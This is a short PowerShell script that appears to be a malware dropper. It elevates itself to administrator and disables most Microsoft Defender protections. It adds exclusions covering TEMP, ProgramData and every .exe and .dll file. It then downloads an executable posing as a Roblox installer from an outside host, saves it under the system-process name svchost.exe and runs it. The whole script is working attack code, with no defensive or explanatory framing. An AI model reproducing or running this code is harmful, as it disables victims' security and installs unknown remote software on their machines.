if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
    Start-Process powershell -Verb RunAs -ArgumentList $arguments
    exit
}

try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    Set-MpPreference -DisableIOAVProtection $true -Force
    Set-MpPreference -DisableNetworkProtection $true -Force
    Set-MpPreference -DisableBehaviorMonitoring $true -Force
    Set-MpPreference -DisableBlockAtFirstSeen $true -Force
    Set-MpPreference -DisableCloudProtection $true -Force
    Set-MpPreference -DisableArchiveScanning $true -Force
    Set-MpPreference -DisableScriptScanning $true -Force
    Set-MpPreference -DisableCpuThrottle $true -Force
    Set-MpPreference -DisableCpuThrottleOnIdleScan $true -Force
} catch { }

try {
    Add-MpPreference -ExclusionPath "$env:TEMP" -Force
    Add-MpPreference -ExclusionPath "$env:ProgramData" -Force
    Add-MpPreference -ExclusionProcess "svchost.exe" -Force
    Add-MpPreference -ExclusionProcess "RobloxPlayerInstaller.exe" -Force
    Add-MpPreference -ExclusionExtension ".exe" -Force
    Add-MpPreference -ExclusionExtension ".dll" -Force
} catch { }

$url = "https://kekman.space/RobloxPlayerInstaller.exe"
$out = "$env:TEMP\svchost.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $out)
Start-Process $out

Start-Sleep -Seconds 60